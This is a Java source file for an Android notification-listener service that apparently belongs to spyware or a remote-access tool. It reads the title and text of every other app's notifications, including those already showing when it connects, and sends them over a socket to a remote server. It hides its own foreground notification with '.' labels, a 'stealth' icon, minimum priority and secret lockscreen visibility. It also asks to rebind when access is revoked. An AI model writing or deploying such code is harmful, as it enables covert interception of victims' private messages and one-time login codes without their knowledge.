package com.fason.app.features.notification;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import androidx.core.app.NotificationCompat;
import com.fason.app.R;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class NotificationRelayService extends NotificationListenerService {
    private static final int NOTIF_ID = 2;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final AtomicBoolean ready = new AtomicBoolean(false);
    private static volatile NotificationRelayService instance;

    public static NotificationRelayService getInstance() {
        return instance;
    }

    public static boolean isEnabled(Context ctx) {
        ComponentName cn = new ComponentName(ctx, NotificationRelayService.class);
        String flat = Settings.Secure.getString(ctx.getContentResolver(), Protocol.SETTING_NOTIF_LISTENERS);
        return flat != null && flat.contains(cn.flattenToString());
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createChannel();
        startForegroundNotif();
        ready.set(true);
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm == null) return;
        NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
        if (existing != null) return;
        NotificationChannel ch = new NotificationChannel(
            Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
        ch.setDescription(".");
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableLights(false);
        ch.enableVibration(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ch.setAllowBubbles(false);
        }
        nm.createNotificationChannel(ch);
    }

    private void startForegroundNotif() {
        Notification n = new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
            .setSmallIcon(R.drawable.ic_notif_stealth)
            .setContentTitle(".")
            .setContentText(".")
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setGroup(Protocol.NOTIF_GROUP)
            .setGroupSummary(false)
            .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (Exception ignored) {
            android.util.Log.w("NotifRelay", "startForeground failed, no FGS", ignored);
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        ready.set(true);
        exec.execute(() -> {
            try {
                JSONObject s = new JSONObject();
                s.put(Protocol.KEY_ENABLED, true);
                s.put(Protocol.KEY_CONNECTED, true);
                s.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) socket.emit(Protocol.NOTIF, s);
            } catch (Exception ignored) {}
            try {
                StatusBarNotification[] active = getActiveNotifications();
                if (active != null) {
                    for (StatusBarNotification sbn : active) {
                        process(sbn, true);
                    }
                }
            } catch (Exception ignored) {}
        });
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (sbn.getPackageName().equals(getPackageName())) return;
        exec.execute(() -> process(sbn, false));
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if (sbn == null) return;
        if (sbn.getPackageName().equals(getPackageName())) return;
        exec.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put(Protocol.KEY_REMOVED, true);
                data.put(Protocol.KEY_PACKAGE_NAME, sbn.getPackageName());
                data.put(Protocol.KEY_ID, sbn.getId());
                data.put(Protocol.KEY_POST_TIME, sbn.getPostTime());
                data.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                SocketClient.getInstance().getSocket().emit(Protocol.NOTIF, data);
            } catch (Exception ignored) {}
        });
    }

    private void process(StatusBarNotification sbn, boolean initial) {
        try {
            Notification n = sbn.getNotification();
            Bundle extras = n.extras;
            String title = txt(extras, Notification.EXTRA_TITLE);
            String text = txt(extras, Notification.EXTRA_TEXT);
            String bigText = txt(extras, Notification.EXTRA_BIG_TEXT);
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_APP_NAME, getAppLabel(sbn.getPackageName()));
            data.put(Protocol.KEY_PACKAGE_NAME, sbn.getPackageName());
            data.put(Protocol.KEY_TITLE, title);
            data.put(Protocol.KEY_CONTENT, bigText.isEmpty() ? text : bigText);
            data.put(Protocol.KEY_POST_TIME, sbn.getPostTime());
            data.put(Protocol.KEY_ID, sbn.getId());
            data.put(Protocol.KEY_TAG, sbn.getTag() != null ? sbn.getTag() : "");
            data.put(Protocol.KEY_ONGOING, sbn.isOngoing());
            data.put(Protocol.KEY_CLEARABLE, sbn.isClearable());
            data.put(Protocol.KEY_INITIAL, initial);
            data.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            if (n.category != null) {
                data.put(Protocol.KEY_CATEGORY, n.category);
            }
            SocketClient.getInstance().getSocket().emit(Protocol.NOTIF, data);
        } catch (Exception ignored) {}
    }

    private String txt(Bundle extras, String key) {
        if (extras == null) return "";
        CharSequence seq = extras.getCharSequence(key);
        return seq != null ? seq.toString() : "";
    }

    private String getAppLabel(String pkg) {
        if (pkg == null || pkg.isEmpty()) return "";
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            return String.valueOf(pm.getApplicationLabel(ai));
        } catch (Exception e) {
            return pkg;
        }
    }

    @Override
    public void onListenerDisconnected() {
        ready.set(false);
        try {
            JSONObject s = new JSONObject();
            s.put(Protocol.KEY_ENABLED, false);
            s.put(Protocol.KEY_CONNECTED, false);
            s.put(Protocol.KEY_ERROR, "Listener disconnected (access revoked?)");
            s.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            io.socket.client.Socket socket = com.fason.app.core.network.SocketClient.getInstance().getSocket();
            if (socket != null) socket.emit(Protocol.NOTIF, s);
        } catch (Exception ignored) {}
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            requestRebind(new ComponentName(this, getClass()));
        }
    }

    @Override
    public void onDestroy() {
        ready.set(false);
        instance = null;
        exec.shutdown();
        super.onDestroy();
    }

    public static void requestPermission(Context ctx) {
        if (!isEnabled(ctx)) {
            Intent i;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS);
                i.putExtra(Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME,
                    new ComponentName(ctx, NotificationRelayService.class).flattenToString());
            } else {
                i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            try {
                ctx.startActivity(i);
            } catch (android.content.ActivityNotFoundException e) {
                try {
                    Intent fallback = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(fallback);
                } catch (Exception ignored) {}
            }
        }
    }

    public boolean isReady() {
        return ready.get();
    }
}
